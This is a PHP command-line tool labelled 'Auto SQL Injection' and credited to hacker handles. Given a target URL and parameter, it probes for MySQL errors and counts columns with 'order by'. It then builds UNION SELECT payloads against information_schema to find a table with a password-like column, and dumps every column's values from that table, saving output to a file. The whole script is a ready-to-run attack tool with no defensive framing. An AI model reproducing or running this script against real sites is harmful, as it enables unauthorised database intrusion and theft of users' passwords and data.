<?
        @set_time_limit(0)
        @error_reporting(0)
        if(count($argv)<=2)
        {
                print("

Auto SQL Injection =D

#Coders : Mr.Gh0s7 & Mr.Dm4r
#Home: code104 | silkroad | ICP | Team Incrypto\n");
                print "Usage : php {$argv[0]} site.com/file.php?id=1 id\n";
                die();
        }
        function checke($url){
    $login = $url;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$login);
        curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 5.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1');
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
        $result = curl_exec($ch);
    curl_close($ch);
        return $result;
    }
        $target = urldecode($argv[1]);
        $id = $argv[2];
        #preg_match("#(\?)?{$id}\=([0-9]{1,6})(&)?#",$target,$m);
        #print_r($m);
        #exit();
        $test = preg_replace("#{$id}\=([0-9]{1,6})#","{$id}=$1'",$target);
        $get = file_get_contents("{$test}");
        if(eregi("MySQL",$get))
        {
                echo "Infected .. Trying To Exploit\r\n";
                $test2 = preg_replace("#{$id}\=([0-9]{1,6})#","{$id}=$1+/*!order+by*/+1000--",$target);
                $order1 = file_get_contents($test2);
                if(eregi("MySQL",$order1) or eregi("'1000' in 'order",$order1))
                {
                        echo "Please wite to get cals\r\n";
                }else{
                        echo "Can't Get cols please test orther site\r\n";
                        exit();
                }
                for($i=1;$i<=50;$i++)
                {
                        echo (($i-1)==0)?"":"Col ".($i-1)."\r\n";
                        $un .= "{$i},";
                        $test1 = preg_replace("#{$id}\=([0-9]{1,6})#","{$id}=$1+/*!order+by*/+{$i}--",$target);
                        $order = file_get_contents($test1);
                        if(!$order)
                        {
                                echo "Target Falied. \r\n";
                                exit();
                        }
                        if(eregi("MySQL",$order) or eregi("'{$i}' in 'order",$order))
                        {      
                                $by = ($i-0);
                                echo "order by = ".($i-1)." \r\n";
                                break;
                        }
                }
                $u = $by;
                $un = preg_replace("#,{$u},#","",$un);
                $target = preg_replace("#{$id}\=([0-9]{1,6})#","{$id}=-$1",$target);
                $injc = preg_replace("#[0-9]{1,50}#","/*!concat(0x4d722e446d3472,column_name,0x7c3a7c,table_schema,0x7c3a7c,table_name,0x4d722e446d3472)*/",$un);
                $url = urlencode(" /*!union select*/ {$injc} /*!from information_schema.columns where column_name like char(37, 112, 97, 115, 115, 37)*/--");
                $fulltarget = "{$target}{$url}";
                $exploit = @file_get_contents($fulltarget);
                preg_match("#Mr.Dm4r(.*?)Mr.Dm4r#",$exploit,$m);
                $exp = explode("|:|",$m[1]);
                $password = (($exp[0])=="")?"0x4e6f7420466f756e64":$exp[0];
                $db = $exp[1];
                $table = $exp[2];
                $sqltable = bin2hex($table);
                if($password == "0x4e6f7420466f756e64"){exit("Error");}
                $injc2 = preg_replace("#[0-9]{1,50}#","/*!concat(0x4d722e446d3472,group_concat(column_name),0x4d722e446d3472)*/",$un);
                $url2 = urlencode(" /*!union select*/ {$injc2} /*!from information_schema.columns where table_name=0x{$sqltable}*/--");
                $fulltarget2 = "{$target}{$url2}";
                $exploit2 = @file_get_contents($fulltarget2);
                preg_match("#Mr.Dm4r(.*?)Mr.Dm4r#",$exploit2,$m2);
                $m2[1] = explode(",",$m2[1]);
                foreach($m2[1] as $tables)
                {
                        if($m2[1][count($m2[1])-1]==$tables)
                        {
                                $col .= "{$tables}";
                        }else{
                                $col .= "{$tables},0x7c3a7c,";
                        }
                        $cols[]=$tables;
                }
                $injc3 = preg_replace("#[0-9]{1,50}#","/*!concat(0x4d722e446d3472,{$col},0x4d722e446d3472)*/",$un);
                $url3 = urlencode(" /*!union select*/ {$injc3} /*! from {$table}*/--");
                $fulltarget3 = "{$target}{$url3}";
                $exploit3 = @file_get_contents($fulltarget3);
                preg_match("#Mr.Dm4r(.*?)Mr.Dm4r#",$exploit3,$m3);
                $infos = explode("|:|",$m3[1]);
                $i=0;
                foreach($infos as $info){
                        echo "{$cols[$i]} : {$info}\r\n";
                $i++;
                }
                file_put_contents("dd.txt",$exploit2."\r\n".$fulltarget2);
                #print_r($m2);
        } else {
                echo "not infected";
        }
 
?>
